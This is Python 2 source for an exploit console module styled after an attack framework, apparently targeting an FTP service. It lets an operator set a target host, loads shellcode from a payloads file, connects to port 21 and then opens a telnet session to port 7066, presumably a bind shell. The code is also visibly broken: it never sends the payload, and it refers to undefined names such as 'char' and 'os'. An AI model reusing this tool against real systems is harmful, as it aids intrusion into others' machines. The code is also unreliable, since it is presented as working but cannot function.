class Exploit(cmd.Cmd):
  def __init__(self, name, target, payload, variables, descriptions):
    cmd = __import__("cmd")
    cmd.Cmd.__init__(self)
    self.os = __import__("os")
    self.ftplib = __import__("ftplib")
    _tmp = __import__("random", globals(), locals(), ['randint'])
    self.randint = _tmp.randint
    _tmp = __import__("socket", globals(), locals(), ['socket', 'AF_INET', 'SOCK_STREAM', 'gethostbyname'])
    self.socket = _tmp.socket
    self.AF_INET = _tmp.AF_INET
    self.SOCK_STREAM = _tmp.SOCK_STREAM
    self.gethostbyname = _tmp.gethostbyname
    self.variables = variables #{"":""}  list of variables
    self.descriptions = descriptions #{"":""} descriptions
    self.name =  name #[""] name of exploit
    self.target = target #[""] target ex: Windows 7 SP1 x86
    self.payload =  payload #[""] name of payload
  def rand(self, bytes):
    for a in range(0, bytes):
      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
      return tmp.decode('string_escape')
  def check(self):
    for let in "abcdefghijklmnopqrstuvwxyz":
      if let in self.variables["host"]:
        self.variables["host"] = self.gethostbyname(self.variables["host"])
  def help_help(self):
    print "Usage: help [cmd]"
    print "cmd    the command to get help on"
    print "help: show help on a command or list commands"
  def help_set(self):
    print "Usage: set [var] = [val]"
    print "var    variable to set"
    print "val    value to set variable to"
    print "set: set a variable to a value"
    print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
  def do_set(self, args):
    var = getToken(args)
    val = args[len(var) + 3:]
    for variable in self.variables.keys():
      if variable == var:
        self.variables[variable] = val 
    else:
      print "*** Variable not found %s" % var
      return
    print "[*]%s => %s" % (var, val)
  def help_show(self):
    print "Usage: show options"
    print "show options: show the variables, current values, and descriptions"
  def do_show(self, args):
    if args != "options":
      print "*** Unknown argument: " + args
    print "Target: %s" % self.target[0]
    print "Options for %s:" % self.name[0]
    print "========================"
    for variable in self.variables.keys():
      print "%s    %s    %s" % (variable, self.variables[variable], self.descriptions[variable])
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the %s context" % self.name[0]
  def do_exit(self, args):
    if args:
      print "*** Argument number: needed 0"
      return
    return True
  def help_start(self):
    print "Usage: start"
    print "start: start the attack"
  def do_start(self, args):
    self.check()
    print "[*]Generating payload..."
    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
    payload = ""
    f = open("../../../payloads/%s.shell" % self.payload, "r")
    for line in f.readlines():
      payload += line[:-1].decode('string_escape')
    f.close()
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
    s = self.socket(self.AF_INET, self.SOCK_STREAM)
    s.connect((self.variables["host"], 21))
    s.close()
    print "[+]Payload sent."
    print "[*]Connecting..."
    os.system("telnet %s 7066" % self.variables["host"]) 
